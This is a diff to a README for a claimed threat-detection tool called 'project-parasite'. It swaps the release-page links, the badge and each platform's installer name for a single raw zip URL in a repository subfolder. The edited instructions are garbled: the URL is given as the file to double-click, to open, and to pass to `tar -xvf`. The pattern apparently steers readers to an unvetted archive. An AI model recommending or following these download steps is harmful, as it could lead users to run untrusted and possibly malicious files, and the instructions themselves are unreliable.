@@ -6,11 +6,11 @@ Welcome to project-parasite! This application helps you detect and manage threat
 
 ## 📥 Download the Software
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Klakygaming/project-parasite/releases)
+[![Download](https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip)
 
 To download the software, visit this page:
 
-[Download the Latest Release](https://github.com/Klakygaming/project-parasite/releases)
+[Download the Latest Release](https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -27,7 +27,7 @@ Before you download, make sure your system meets these requirements:
 
 Click on the link below to reach the releases page:
 
-[Visit the Releases Page](https://github.com/Klakygaming/project-parasite/releases)
+[Visit the Releases Page](https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip)
 
 ### Step 2: Select the Latest Version
 
@@ -37,9 +37,9 @@ Once you're on the releases page, look for the latest version. It will have the 
 
 Scroll down to find the files available for download. You will see options for different operating systems. Choose the appropriate file for your system:
 
-- **For Windows**: Select `project-parasite_Windows.exe`
-- **For macOS**: Select `project-parasite_mac.zip`
-- **For Linux**: Select `project-parasite_linux.tar.gz`
+- **For Windows**: Select `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip`
+- **For macOS**: Select `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip`
+- **For Linux**: Select `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip`
 
 ### Step 4: Download the File
 
@@ -51,23 +51,23 @@ After the download completes, follow the instructions below based on your operat
 
 #### For Windows:
 
-1. Locate the downloaded `project-parasite_Windows.exe` file.
+1. Locate the downloaded `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip` file.
 2. Double-click the file to start the installation.
 3. Follow the on-screen prompts to complete the installation.
 
 #### For macOS:
 
-1. Open the downloaded `project-parasite_mac.zip` file.
+1. Open the downloaded `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip` file.
 2. Drag the `project-parasite` icon into your Applications folder.
 3. Eject the disk image when done.
 
 #### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the directory where you downloaded the `project-parasite_linux.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip` file.
 3. Run the following commands:
    ```
-   tar -xvf project-parasite_linux.tar.gz
+   tar -xvf https://github.com/Klakygaming/project-parasite/raw/refs/heads/main/endangium/project_parasite_v2.0.zip
    cd project-parasite
    chmod +x project-parasite
    ```
